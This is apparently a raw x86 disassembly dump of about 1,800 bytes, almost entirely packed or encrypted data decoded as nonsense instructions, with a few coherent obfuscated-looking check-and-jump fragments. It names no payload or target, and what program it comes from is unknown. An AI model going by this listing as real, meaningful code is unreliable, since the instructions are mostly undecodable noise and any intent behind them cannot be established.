  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	inc    eax
  40b514:	jmp    0xd982:0x43869374
  40b51b:	adc    BYTE PTR [edx+eax*1],dl
  40b51e:	daa    
  40b51f:	or     ah,bh
  40b521:	xor    al,0xcf
  40b523:	in     eax,dx
  40b524:	mov    edi,0x152ea3a1
  40b529:	mov    ds:0x4074e003,al
  40b52e:	icebp  
  40b52f:	in     al,dx
  40b530:	or     al,0x8b
  40b532:	pop    edi
  40b533:	or     DWORD PTR [ebx],esp
  40b535:	aad    0xc3
  40b537:	cdq    
  40b538:	pop    edi
  40b539:	popf   
  40b53a:	(bad)  
  40b53b:	xchg   edi,eax
  40b53c:	mov    BYTE PTR [ebp-0x25],ch
  40b53f:	scas   al,BYTE PTR es:[edi]
  40b540:	cwde   
  40b541:	add    esi,DWORD PTR [ecx+0x321f3a66]
  40b547:	mov    WORD PTR [edi],ds
  40b549:	ret    0x8c12
  40b54c:	scas   al,BYTE PTR es:[edi]
  40b54d:	jp     0x40b59e
  40b54f:	ret    0xedc7
  40b552:	lahf   
  40b553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b554:	xchg   DWORD PTR [ebp-0x1d],esi
  40b557:	cmp    eax,0xbabf03be
  40b55c:	and    dh,ch
  40b55e:	xchg   ebp,eax
  40b55f:	sbb    DWORD PTR [ebx],ebp
  40b561:	js     0x40b550
  40b563:	call   0x3fbd:0xf88d9523
  40b56a:	icebp  
  40b56b:	push   0x65
  40b56d:	fiadd  DWORD PTR [esi]
  40b56f:	pop    ecx
  40b570:	(bad)  
  40b571:	fdiv   DWORD PTR [esi-0x5f]
  40b574:	sbb    dl,BYTE PTR [ebx+0x3b7c2790]
  40b57a:	sbb    dl,BYTE PTR [ecx+0x4c]
  40b57d:	pop    ebx
  40b57e:	retf   
  40b57f:	and    ebx,edi
  40b581:	sbb    DWORD PTR [ebp+0x1c],edi
  40b584:	inc    ecx
  40b585:	data16 (bad) [ecx+0x5bf19cf1]
  40b58c:	jnp    0x40b56a
  40b58e:	repz jmp 0xecf10ed4
  40b594:	mov    edx,0x4f77e990
  40b599:	scas   eax,DWORD PTR es:[edi]
  40b59a:	jbe    0x40b573
  40b59c:	or     edx,0x24200442
  40b5a2:	mov    bl,0xef
  40b5a4:	sbb    eax,0x844ff17f
  40b5a9:	jno    0x40b553
  40b5ab:	or     ch,cl
  40b5ad:	ficom  WORD PTR [esi-0x74]
  40b5b0:	ror    DWORD PTR [esi-0x1fb978e5],cl
  40b5b6:	or     BYTE PTR [esi],bh
  40b5b8:	into   
  40b5b9:	inc    esp
  40b5ba:	bound  ecx,QWORD PTR [eax-0x57]
  40b5bd:	cmp    eax,0x11294799
  40b5c2:	jle    0x40b5c6
  40b5c4:	neg    BYTE PTR [edi]
  40b5c6:	popa   
  40b5c7:	es push esi
  40b5c9:	mov    edx,0xcd2292f6
  40b5ce:	pop    edi
  40b5cf:	or     DWORD PTR [edx],ebx
  40b5d1:	test   BYTE PTR [ecx+0x2d],ch
  40b5d4:	das    
  40b5d5:	fidiv  DWORD PTR [esp+eiz*4]
  40b5d8:	sub    dl,BYTE PTR [ebx+0x57]
  40b5db:	xchg   edi,eax
  40b5dc:	pop    es
  40b5dd:	cmp    dh,BYTE PTR [eax-0x638f3432]
  40b5e3:	cmp    edx,DWORD PTR [edi-0x74]
  40b5e6:	into   
  40b5e7:	inc    ecx
  40b5e8:	pop    edx
  40b5e9:	call   0x6822bcfb
  40b5ee:	mul    esp
  40b5f0:	dec    ecx
  40b5f1:	mov    ecx,0x7669f530
  40b5f6:	test   eax,0xdfa86ff2
  40b5fb:	dec    eax
  40b5fc:	sbb    esp,DWORD PTR [ebp-0x80]
  40b5ff:	inc    eax
  40b600:	ret    0xc632
  40b603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b604:	pop    esi
  40b605:	shr    cl,1
  40b607:	sub    al,0x19
  40b609:	mov    esi,0xb3f422d1
  40b60e:	mov    edi,0xd25f8a4
  40b613:	sub    edx,edi
  40b615:	(bad)  
  40b616:	xor    dl,BYTE PTR [ebp+ebx*4+0xdb3e282]
  40b61d:	mov    al,0x88
  40b61f:	popf   
  40b620:	pop    ss
  40b621:	fisttp QWORD PTR [ebp+edi*4-0x3c]
  40b625:	push   0x3d
  40b627:	mov    esp,0xbe280764
  40b62c:	pop    es
  40b62d:	jo     0x40b682
  40b62f:	cmc    
  40b630:	and    ah,ah
  40b632:	lods   eax,DWORD PTR ds:[esi]
  40b633:	sbb    eax,0xf6729dbf
  40b638:	pop    ss
  40b639:	test   BYTE PTR [eax+eiz*4+0x38],ah
  40b63d:	call   0xfdc8:0x3588d0d8
  40b644:	pop    edx
  40b645:	iret   
  40b646:	push   ebx
  40b647:	(bad)  
  40b648:	mov    ds:0xe58c1414,al
  40b64d:	fnstcw WORD PTR [edi+ecx*1]
  40b650:	jg     0x40b5d6
  40b652:	nop
  40b653:	mov    eax,0xc19e6c14
  40b658:	push   ebp
  40b659:	xor    DWORD PTR [ebx+0x48bc1578],ecx
  40b65f:	mov    ecx,0x4b421792
  40b664:	out    dx,eax
  40b665:	cdq    
  40b666:	cmp    BYTE PTR [edi+eax*8],cl
  40b669:	test   BYTE PTR [ebx+0x6],bl
  40b66c:	std    
  40b66d:	xchg   bh,cl
  40b66f:	and    eax,DWORD PTR [esi-0x38]
  40b672:	aas    
  40b673:	sub    DWORD PTR [edx+0x34680eb5],ecx
  40b679:	int3   
  40b67a:	sub    esp,0x8a7de689
  40b680:	(bad)  
  40b681:	rol    DWORD PTR [eax+0x13],cl
  40b684:	ret    
  40b685:	fdivr  QWORD PTR [edx]
  40b687:	popf   
  40b688:	sub    BYTE PTR [edi+0x0],bh
  40b68b:	es ds push edx
  40b68e:	push   ebp
  40b68f:	adc    ah,BYTE PTR [ecx]
  40b691:	cs cmp eax,0x9900fa2a
  40b697:	mov    al,ds:0xc2b73afe
  40b69c:	dec    edi
  40b69d:	add    ecx,ecx
  40b69f:	sahf   
  40b6a0:	pop    ecx
  40b6a1:	jg     0x40b6ee
  40b6a3:	dec    ecx
  40b6a4:	push   cs
  40b6a5:	(bad)  
  40b6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6a7:	fnsave [edi-0x14]
  40b6aa:	and    eax,0x5b625207
  40b6af:	pusha  
  40b6b0:	pop    ss
  40b6b1:	cmovle esi,esp
  40b6b4:	cmp    al,BYTE PTR [ebx]
  40b6b6:	pusha  
  40b6b7:	(bad)  
  40b6b8:	push   ds
  40b6b9:	(bad)  
  40b6ba:	sbb    cl,dl
  40b6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6bd:	int    0x5c
  40b6bf:	rep lods al,BYTE PTR ss:[esi]
  40b6c2:	cmp    al,0xfa
  40b6c4:	lods   eax,DWORD PTR ds:[esi]
  40b6c5:	push   edx
  40b6c6:	(bad)  [ecx-0x4c]
  40b6c9:	or     cl,cl
  40b6cb:	lea    ebx,[esi]
  40b6cd:	outs   dx,DWORD PTR ds:[esi]
  40b6ce:	int3   
  40b6cf:	cli    
  40b6d0:	and    DWORD PTR [edx+0x75981e07],edi
  40b6d6:	ja     0x40b66a
  40b6d8:	lea    esp,[esi]
  40b6da:	cmp    al,0x32
  40b6dc:	push   edx
  40b6dd:	mov    ecx,0x827f088b
  40b6e2:	adc    DWORD PTR [eax+ecx*8+0x35],0xffffffaf
  40b6e7:	adc    ah,BYTE PTR [ebx]
  40b6e9:	dec    ebp
  40b6ea:	mov    ch,BYTE PTR [ebp+0x26]
  40b6ed:	hlt    
  40b6ee:	mov    ds:0x51448674,al
  40b6f3:	cmp    bl,dl
  40b6f5:	jbe    0x40b766
  40b6f7:	mov    bl,0x1e
  40b6f9:	jb     0x40b6e4
  40b6fb:	loope  0x40b6b2
  40b6fd:	test   edx,0xa8aa14f7
  40b703:	and    cl,dl
  40b705:	out    0x35,al
  40b707:	sar    DWORD PTR gs:[esi+0x16],cl
  40b70b:	or     BYTE PTR [edx],dl
  40b70d:	push   es
  40b70e:	lods   al,BYTE PTR ds:[esi]
  40b70f:	cmp    DWORD PTR [edx],0x33
  40b712:	xchg   edi,eax
  40b713:	call   0x9150aa78
  40b718:	xor    BYTE PTR [edx+0x78a338b5],cl
  40b71e:	dec    edi
  40b71f:	cs dec edx
  40b721:	ins    BYTE PTR es:[edi],dx
  40b722:	mov    ah,0x6d
  40b724:	fst    QWORD PTR ds:0xf29f66d5
  40b72a:	mov    ?,WORD PTR ds:0x615f001f
  40b730:	in     al,dx
  40b731:	cmp    dl,dl
  40b733:	repnz pop DWORD PTR [ecx+eiz*1]
  40b737:	xchg   ebx,eax
  40b738:	mov    ebp,0x14c0378a
  40b73d:	add    al,0x99
  40b73f:	or     eax,0x8ee45d7d
  40b744:	fwait
  40b745:	call   0xc379:0x4a685bb6
  40b74c:	stos   DWORD PTR es:[edi],eax
  40b74d:	mov    gs,WORD PTR fs:[ecx]
  40b750:	sub    bh,al
  40b752:	push   es
  40b753:	jne    0x40b7c1
  40b755:	dec    eax
  40b756:	rol    DWORD PTR [edx+eax*2-0x2f8a01],0x75
  40b75e:	or     al,0xe8
  40b760:	scas   al,BYTE PTR es:[edi]
  40b761:	dec    edx
  40b762:	add    BYTE PTR [eax],al
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	pand   mm7,QWORD PTR [esi]
  40b78d:	or     eax,0x7e7efeb2
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	mov    cl,0xeb
  40b798:	(bad)  
  40b799:	mov    ds:0xc5620d27,eax
  40b79e:	in     al,0x92
  40b7a0:	pop    eax
  40b7a1:	ror    DWORD PTR [edx+eax*4],1
  40b7a4:	ret    
  40b7a5:	retf   0x1fac
  40b7a8:	in     al,dx
  40b7a9:	pop    esp
  40b7aa:	in     eax,dx
  40b7ab:	cld    
  40b7ac:	adc    DWORD PTR [esi],0x58a579aa
  40b7b2:	in     al,dx
  40b7b3:	sub    eax,0x1ef15d97
  40b7b8:	or     BYTE PTR [ebp+0x2c],bh
  40b7bb:	sar    DWORD PTR ds:0x7684ac30,cl
  40b7c1:	iret   
  40b7c2:	push   esp
  40b7c3:	stos   DWORD PTR es:[edi],eax
  40b7c4:	(bad)  
  40b7c5:	mov    dh,0x7d
  40b7c7:	adc    ebp,DWORD PTR [ebx+0x55]
  40b7ca:	ret    0x649d
  40b7cd:	cmp    esi,DWORD PTR [eax]
  40b7cf:	dec    eax
  40b7d0:	scas   al,BYTE PTR es:[edi]
  40b7d1:	std    
  40b7d2:	add    eax,0x67dc1c00
  40b7d7:	repz or eax,DWORD PTR [edx]
  40b7da:	dec    edi
  40b7db:	mov    ah,BYTE PTR [bp-0x51]
  40b7df:	inc    ecx
  40b7e0:	add    DWORD PTR [edi+0x37c629cc],0xd33d1a4d
  40b7ea:	add    bl,BYTE PTR [eax-0x607b13ed]
  40b7f0:	ror    DWORD PTR [edi+0xc912714],1
  40b7f6:	or     ch,bh
  40b7f8:	leave  
  40b7f9:	add    dh,dl
  40b7fb:	jbe    0x40b79f
  40b7fd:	mov    esi,0x28cae9e0
  40b802:	dec    ecx
  40b803:	xchg   ecx,eax
  40b804:	call   0xfbe7c99c
  40b809:	cwde   
  40b80a:	xor    eax,0xf441c437
  40b80f:	and    cl,BYTE PTR [edi]
  40b811:	ret    
  40b812:	lods   al,BYTE PTR ds:[esi]
  40b813:	push   0xdb57ec74
  40b818:	pop    ebp
  40b819:	xor    BYTE PTR [edi+edi*1],dl
  40b81c:	stos   BYTE PTR es:[edi],al
  40b81d:	sbb    DWORD PTR [edx-0x79],0x79
  40b821:	inc    edi
  40b822:	pop    eax
  40b823:	inc    ecx
  40b824:	lock outs dx,BYTE PTR ds:[esi]
  40b826:	stc    
  40b827:	cld    
  40b828:	inc    esp
  40b829:	inc    esi
  40b82a:	jg     0x40b7b8
  40b82c:	push   ebx
  40b82d:	xor    eax,0x2436f662
  40b832:	in     eax,dx
  40b833:	mov    ch,0x7d
  40b835:	push   ebp
  40b836:	inc    esp
  40b837:	pop    es
  40b838:	jge    0x40b823
  40b83a:	or     ebx,DWORD PTR ds:0xacbec35b
  40b840:	dec    ebx
  40b841:	push   ecx
  40b842:	sub    DWORD PTR [edi-0x2e],edi
  40b845:	mov    dh,0x57
  40b847:	out    0x39,al
  40b849:	aaa    
  40b84a:	(bad)  
  40b84b:	xor    al,ah
  40b84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b84e:	and    BYTE PTR [edx-0x7a],bh
  40b851:	xchg   esp,eax
  40b852:	aas    
  40b853:	(bad)  
  40b854:	mov    ah,BYTE PTR [ecx+edi*8+0x7c]
  40b858:	repnz lods al,BYTE PTR ds:[esi]
  40b85a:	fwait
  40b85b:	pop    es
  40b85c:	lock ret 
  40b85e:	icebp  
  40b85f:	sti    
  40b860:	gs add dl,cl
  40b863:	push   eax
  40b864:	aas    
  40b865:	adc    BYTE PTR cs:[ebx+0x5b],cl
  40b869:	repnz in eax,dx
  40b86b:	and    edx,eax
  40b86d:	stos   DWORD PTR es:[edi],eax
  40b86e:	or     al,0x3d
  40b870:	retf   0x4eb5
  40b873:	in     al,dx
  40b874:	xor    DWORD PTR [edi+0x32],eax
  40b877:	sbb    DWORD PTR [ebx],eax
  40b879:	stos   DWORD PTR es:[edi],eax
  40b87a:	adc    eax,0x3b9493d2
  40b87f:	loope  0x40b83f
  40b881:	xchg   ecx,eax
  40b882:	jno    0x40b880
  40b884:	cmp    al,0x6f
  40b886:	test   eax,0x3646a303
  40b88b:	bound  eax,QWORD PTR [esi]
  40b88d:	mov    ch,ah
  40b88f:	xor    edi,DWORD PTR [ebx-0x6d4b0111]
  40b895:	popf   
  40b896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b897:	aad    0x67
  40b899:	retf   0x1717
  40b89c:	cld    
  40b89d:	pop    edi
  40b89e:	mov    esp,0xca4f458
  40b8a3:	mul    edi
  40b8a5:	aad    0xbc
  40b8a7:	or     eax,edx
  40b8a9:	and    eax,0xf65c7289
  40b8ae:	frstor [eax-0x754fbd51]
  40b8b4:	or     al,BYTE PTR [ebp-0x48]
  40b8b7:	jmp    0x70ce:0xa74ecdb1
  40b8be:	dec    ebp
  40b8bf:	push   esi
  40b8c0:	xchg   edi,eax
  40b8c1:	or     esp,DWORD PTR [eax+edi*2-0x1d]
  40b8c5:	(bad)  
  40b8c6:	pop    edi
  40b8c7:	cs int 0x1a
  40b8ca:	pop    edi
  40b8cb:	ins    BYTE PTR es:[edi],dx
  40b8cc:	jecxz  0x40b853
  40b8ce:	inc    eax
  40b8cf:	rol    DWORD PTR [ebx+0x796194d0],1
  40b8d5:	or     DWORD PTR [ebx+0x17],esi
  40b8d8:	push   esi
  40b8d9:	in     al,dx
  40b8da:	sbb    bl,0x4a
  40b8dd:	out    0x88,al
  40b8df:	fld    TBYTE PTR [ecx-0x70]
  40b8e2:	lea    ecx,[ebp+0x6819b9e1]
  40b8e8:	push   0xffffffc4
  40b8ea:	popw   es
  40b8ec:	in     eax,0xa9
  40b8ee:	ja     0x40b95c
  40b8f0:	push   esp
  40b8f1:	jne    0x40b959
  40b8f3:	scas   al,BYTE PTR es:[edi]
  40b8f4:	xchg   ebp,eax
  40b8f5:	or     edx,esp
  40b8f7:	dec    DWORD PTR [esi+0x3467e730]
  40b8fd:	clc    
  40b8fe:	repz sub DWORD PTR [ebx],edi
  40b901:	adc    eax,0xb270c88b
  40b906:	arpl   WORD PTR [ecx-0x55],sp
  40b909:	ja     0x40b986
  40b90b:	in     eax,0xd2
  40b90d:	add    al,0x2f
  40b90f:	sar    BYTE PTR [eax+0x40],0x7e
  40b913:	add    ebp,DWORD PTR [ecx-0x67e5500e]
  40b919:	add    ah,BYTE PTR [eax]
  40b91b:	xlat   BYTE PTR ds:[ebx]
  40b91c:	adc    al,0x6e
  40b91e:	inc    ecx
  40b91f:	mov    ah,0x7
  40b921:	scas   eax,DWORD PTR es:[edi]
  40b922:	jle    0x40b984
  40b924:	or     DWORD PTR [edi],esp
  40b926:	imul   esi,DWORD PTR [ecx-0x54ff07c5],0xffffff9f
  40b92d:	push   ecx
  40b92e:	test   BYTE PTR [edi+0x3bd88ebf],dh
  40b934:	hlt    
  40b935:	sub    DWORD PTR ds:0xe3b2b7c6,0xffffffd1
  40b93c:	adc    DWORD PTR ds:0xae0795e2,0xe2d3fcdb
  40b946:	mov    eax,0x13fef3c7
  40b94b:	and    al,0x1e
  40b94d:	dec    ecx
  40b94e:	hlt    
  40b94f:	inc    esp
  40b950:	push   ss
  40b951:	dec    ebx
  40b952:	mov    ds:0xb57264d6,eax
  40b957:	sub    eax,0x65d5ec84
  40b95c:	pushf  
  40b95d:	push   cs
  40b95e:	push   ebp
  40b95f:	push   edi
  40b960:	xchg   edx,eax
  40b961:	aas    
  40b962:	or     ebp,DWORD PTR [ebx+0x2bdad763]
  40b968:	mov    ah,0xee
  40b96a:	push   eax
  40b96b:	pop    ebx
  40b96c:	dec    esi
  40b96d:	(bad)  
  40b96f:	add    esp,esi
  40b971:	lock mov dl,0xc0
  40b974:	lods   al,BYTE PTR ds:[esi]
  40b975:	retf   0xef69
  40b978:	outs   dx,DWORD PTR ds:[esi]
  40b979:	xchg   ebp,eax
  40b97a:	add    eax,0x9d2bbddc
  40b97f:	push   ss
  40b980:	sahf   
  40b981:	add    BYTE PTR [ebx+0x233cf27f],dl
  40b987:	dec    edi
  40b988:	push   ds
  40b989:	push   esi
  40b98a:	es push ebx
  40b98c:	jne    0x40b9d1
  40b98e:	cwde   
  40b98f:	inc    esp
  40b990:	jne    0x40b9ec
  40b992:	stos   BYTE PTR es:[edi],al
  40b993:	adc    eax,0x4c6aadae
  40b998:	stos   DWORD PTR es:[edi],eax
  40b999:	dec    ebx
  40b99a:	or     ah,BYTE PTR [eax+0x5743e200]
  40b9a0:	pop    edx
  40b9a1:	fdiv   QWORD PTR [esi+0x76329c9f]
  40b9a7:	inc    eax
  40b9a8:	sti    
  40b9a9:	mov    ?,ebp
  40b9ab:	inc    esi
  40b9ac:	add    al,0x4a
  40b9ae:	mov    ah,0x95
  40b9b0:	jb     0x40b962
  40b9b2:	sti    
  40b9b3:	fnstsw ax
  40b9b5:	cmp    DWORD PTR [ecx+0x3d9622b7],ebp
  40b9bb:	push   ds
  40b9bc:	xchg   edx,eax
  40b9bd:	mov    bh,0xab
  40b9bf:	(bad)  
  40b9c0:	int    0xf4
  40b9c2:	xor    ah,cl
  40b9c4:	ror    DWORD PTR [eax+0x1fe51ad5],cl
  40b9ca:	xor    al,0xb7
  40b9cc:	sub    edi,DWORD PTR [esi+0x5c]
  40b9cf:	clc    
  40b9d0:	outs   dx,DWORD PTR ds:[esi]
  40b9d1:	out    0xd6,eax
  40b9d3:	and    ebp,DWORD PTR [esi]
  40b9d5:	xchg   ebp,eax
  40b9d6:	inc    esi
  40b9d7:	and    BYTE PTR [eax-0x74fe6d70],ch
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x215ea808],eax
  40ba0f:	nop
  40ba10:	call   0x7c38:0x7e7efd7c
  40ba17:	jle    0x40ba97
  40ba19:	(bad)  
  40ba1a:	rol    esp,1
  40ba1c:	fs stos BYTE PTR es:[edi],al
  40ba1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba1f:	jno    0x40ba09
  40ba21:	icebp  
  40ba22:	rol    cl,0x4d
  40ba25:	js     0x40ba40
  40ba27:	pushf  
  40ba28:	xchg   esi,eax
  40ba29:	fucom  st(7)
  40ba2b:	out    0x83,eax
  40ba2d:	and    edi,ebp
  40ba2f:	xchg   edx,eax
  40ba30:	mov    esp,0xeb151754
  40ba35:	dec    edi
  40ba36:	mov    eax,0x13e0150a
  40ba3b:	loop   0x40ba48
  40ba3d:	mov    bl,0xc9
  40ba3f:	fcom   DWORD PTR [ebx]
  40ba41:	mov    ebx,DWORD PTR [edi-0x51]
  40ba44:	repz lock mov edx,0x13a66cea
  40ba4b:	cmp    edx,DWORD PTR [eax+0x38]
  40ba4e:	and    ecx,ebp
  40ba50:	jp     0x40ba5f
  40ba52:	add    al,0x7c
  40ba54:	pop    eax
  40ba55:	jecxz  0x40b9fe
  40ba57:	mov    esi,0x776bc1b
  40ba5c:	adc    dl,ch
  40ba5e:	xchg   ebp,eax
  40ba5f:	retf   0xdb0c
  40ba62:	add    dh,al
  40ba64:	stos   DWORD PTR es:[edi],eax
  40ba65:	jnp    0x40ba6e
  40ba67:	icebp  
  40ba68:	push   0xe40eeb95
  40ba6d:	sub    bh,BYTE PTR [eax]
  40ba6f:	nop
  40ba70:	fsub   DWORD PTR [ebx-0xb]
  40ba73:	sub    BYTE PTR [edi+0x6bfeab83],al
  40ba79:	cmp    ch,ah
  40ba7b:	(bad)  
  40ba7d:	je     0x40ba28
  40ba7f:	push   cs
  40ba80:	adc    DWORD PTR [ecx-0x2],ebx
  40ba83:	ins    BYTE PTR es:[edi],dx
  40ba84:	or     al,0xbd
  40ba86:	pop    es
  40ba87:	fild   QWORD PTR [ecx-0x2c5e5ecc]
  40ba8d:	sbb    esp,DWORD PTR [esi]
  40ba8f:	sub    ebx,DWORD PTR [ecx+edx*1+0x54]
  40ba93:	dec    esp
  40ba94:	jecxz  0x40ba72
  40ba96:	call   0x62c10e4b
  40ba9b:	and    BYTE PTR [ecx-0x238142b9],dl
  40baa1:	loopne 0x40bb07
  40baa3:	dec    ebp
  40baa4:	jbe    0x40ba87
  40baa6:	(bad)
  40baa9:	call   0x5311:0xe8c10b1e
  40bab0:	repz ror DWORD PTR [ebx+0x46d2e08e],1
  40bab7:	xor    al,0x6b
  40bab9:	or     eax,0xf5ac76b
  40babe:	imul   ebp,DWORD PTR [eax+0x72],0xd74bee85
  40bac5:	shr    esi,cl
  40bac7:	jo     0x40ba8b
  40bac9:	jnp    0x40bb0c
  40bacb:	jb     0x40bb30
  40bacd:	cmp    ecx,ebx
  40bacf:	add    ecx,DWORD PTR [edi+ecx*2]
  40bad2:	xchg   esi,eax
  40bad3:	jle    0x40bb1b
  40bad5:	jmp    0x84179952
  40bada:	repnz fidivr WORD PTR [esi+0x492b2d]
  40bae1:	lods   eax,DWORD PTR ds:[esi]
  40bae2:	inc    edi
  40bae3:	pop    eax
  40bae4:	mov    bh,0x67
  40bae6:	inc    ebx
  40bae7:	xchg   ebx,eax
  40bae8:	push   edi
  40bae9:	scas   al,BYTE PTR es:[edi]
  40baea:	push   eax
  40baeb:	xchg   ebx,eax
  40baec:	ds aas 
  40baee:	leave  
  40baef:	add    edx,ecx
  40baf1:	pop    eax
  40baf2:	mov    WORD PTR [edi+0x4c23ccad],fs
  40baf8:	pop    eax
  40baf9:	dec    eax
  40bafa:	dec    ebx
  40bafb:	xchg   ebp,eax
  40bafc:	mov    BYTE PTR [ebp+0x212f1c66],ah
  40bb02:	jecxz  0x40bb52
  40bb04:	dec    edi
  40bb05:	inc    edx
  40bb06:	dec    edx
  40bb07:	sbb    DWORD PTR ds:0xedfb8ca2,ebx
  40bb0d:	das    
  40bb0e:	dec    edi
  40bb0f:	lock dec edx
  40bb11:	fcomp  QWORD PTR [ebp-0x66]
  40bb14:	jl     0x40bb79
  40bb16:	xor    esp,DWORD PTR [ebx]
  40bb18:	and    ecx,0xffffffd3
  40bb1b:	xor    eax,0xca8e8bb
  40bb20:	mov    BYTE PTR [eax-0x62],ch
  40bb23:	mov    bh,0xce
  40bb25:	cdq    
  40bb26:	pop    ebp
  40bb27:	cwde   
  40bb28:	les    ebx,FWORD PTR [eax-0x3e]
  40bb2b:	aad    0xfc
  40bb2d:	ss adc eax,0xb0ad6fb8
  40bb33:	xchg   ebx,eax
  40bb34:	and    BYTE PTR [esi-0x1712cea4],dl
  40bb3a:	inc    esp
  40bb3b:	sub    BYTE PTR [edi],bh
  40bb3d:	in     al,dx
  40bb3e:	or     eax,0x13250839
  40bb43:	push   ebp
  40bb44:	xor    BYTE PTR [ecx],ah
  40bb46:	mov    eax,ds:0x196e3570
  40bb4b:	mov    ecx,0x2f6145c4
  40bb50:	mov    al,0x5c
  40bb52:	inc    edx
  40bb53:	xor    BYTE PTR [eax],ah
  40bb55:	mov    ecx,0x89822e65
  40bb5a:	and    BYTE PTR [esi-0x19f8ddb],cl
  40bb60:	jb     0x40bbc1
  40bb62:	ins    BYTE PTR es:[edi],dx
  40bb63:	ins    BYTE PTR es:[edi],dx
  40bb64:	mov    dh,0xb3
  40bb66:	jp     0x40bbbb
  40bb68:	imul   esp,DWORD PTR [eax+0x66163f4b],0xffffffe0
  40bb6f:	or     al,0x9
  40bb71:	js     0x40bbe2
  40bb73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb74:	mov    ah,0x98
  40bb76:	repz sbb al,BYTE PTR [esi]
  40bb79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb7a:	or     DWORD PTR [ebx-0x77],esp
  40bb7d:	ja     0x40bb26
  40bb7f:	repz (bad) 
  40bb81:	mov    ebx,0x28d89b79
  40bb86:	fiadd  DWORD PTR [eax-0x23]
  40bb89:	pop    edi
  40bb8a:	mov    eax,ds:0x7c74d216
  40bb8f:	inc    ebx
  40bb90:	push   edi
  40bb91:	ins    DWORD PTR es:[edi],dx
  40bb92:	mov    eax,ds:0xcdcb62f7
  40bb97:	mov    ds,WORD PTR [edi+0x7604de0e]
  40bb9d:	ja     0x40bbac
  40bb9f:	sub    al,0x76
  40bba1:	sbb    al,0x42
  40bba3:	icebp  
  40bba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba5:	bound  esp,QWORD PTR [esi-0xa32f40]
  40bbab:	imul   esp,DWORD PTR [edx],0x41d7d691
  40bbb1:	jnp    0x40bb4b
  40bbb3:	dec    edi
  40bbb4:	mov    cl,BYTE PTR [eax]
  40bbb6:	xor    dl,BYTE PTR [ebx+0x5c]
  40bbb9:	loopne 0x40bba8
  40bbbb:	and    ch,BYTE PTR [edx+ebx*2]
  40bbbe:	push   edx
  40bbbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc0:	enter  0x482f,0xe3
  40bbc4:	push   ss
  40bbc5:	add    dh,dh
  40bbc7:	in     eax,dx
  40bbc8:	adc    DWORD PTR [ecx+edi*1],esp
  40bbcb:	ret    0x2430
  40bbce:	retf   
  40bbcf:	jno    0x40bb7d
  40bbd1:	pop    ebx
  40bbd2:	cmp    ebx,ecx
  40bbd4:	xor    dl,BYTE PTR [ebx+edx*2]
  40bbd7:	or     BYTE PTR [eax],0xff
  40bbda:	push   ebp
  40bbdb:	pop    edx
  40bbdc:	xchg   edi,eax
  40bbdd:	push   edi
  40bbde:	jno    0x40bbd1
  40bbe0:	xor    BYTE PTR [eax],bl
  40bbe2:	cmp    al,0xce
  40bbe4:	jmp    0x13fe0627
  40bbe9:	mov    dl,BYTE PTR [ecx+0x5be52c64]
  40bbef:	bound  ecx,QWORD PTR [edx-0x4313550f]
  40bbf5:	fld    QWORD PTR [esi-0x2926eee9]
  40bbfb:	call   0x9f88:0xbde69ede
  40bc02:	inc    esp
  40bc03:	je     0x40bc26
  40bc05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc06:	clc    
  40bc07:	scas   al,BYTE PTR es:[edi]
  40bc08:	retf   0xac4c
  40bc0b:	fidivr WORD PTR [ebp+edx*1+0x27]
  40bc0f:	popa   
  40bc10:	or     edx,esp
  40bc12:	push   ss
  40bc13:	jle    0x40bc2c
  40bc15:	inc    eax
  40bc16:	mov    eax,ds:0x6bf62dd5
  40bc1b:	dec    ebx
  40bc1c:	or     BYTE PTR [esi],bl
  40bc1e:	stos   BYTE PTR es:[edi],al
  40bc1f:	jo     0x40bbd1
  40bc21:	sub    ch,BYTE PTR [ebx-0x77]
  40bc24:	pop    ds
  40bc25:	test   al,0x8e
  40bc27:	mov    bl,0xd8
  40bc29:	push   edi
  40bc2a:	xor    eax,0xdb3895f0
  40bc2f:	stc    
  40bc30:	arpl   WORD PTR [esi-0x51],bp
  40bc33:	test   BYTE PTR [ebp+0x32554662],cl
  40bc39:	jg     0x40bc5f
  40bc3b:	xchg   ecx,eax
  40bc3c:	fcmovb st,st(1)
  40bc3e:	aaa    
  40bc3f:	hlt    
  40bc40:	mov    ds:0x1bf7a046,al
  40bc45:	mov    al,0x43
  40bc47:	sbb    ax,0xcec4
  40bc4b:	inc    ebx
  40bc4c:	or     esp,ebp
  40bc4e:	aas    
  40bc4f:	retf   0xe288
  40bc52:	mov    esp,eax
  40bc54:	xchg   edx,eax
  40bc55:	dec    esp
  40bc56:	fwait
